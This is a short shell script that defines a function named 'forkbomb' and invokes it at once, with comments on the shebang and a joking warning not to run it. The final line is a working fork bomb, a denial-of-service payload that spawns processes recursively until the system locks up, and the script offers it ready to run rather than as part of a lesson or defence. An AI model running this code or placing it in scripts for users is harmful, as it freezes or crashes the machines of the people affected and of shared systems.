#!/bin/sh

# ^ Shebang (#!) used to direct script where the bash interpreter is. 


# Description:
# Creating fork bomb in one line of script with a custom name.
#
# WARNING: Don't run this script if you want to keep your computer functional :). 

# Commencing forkbomb.
forkbomb() { forkbomb|forkbomb &}; forkbomb
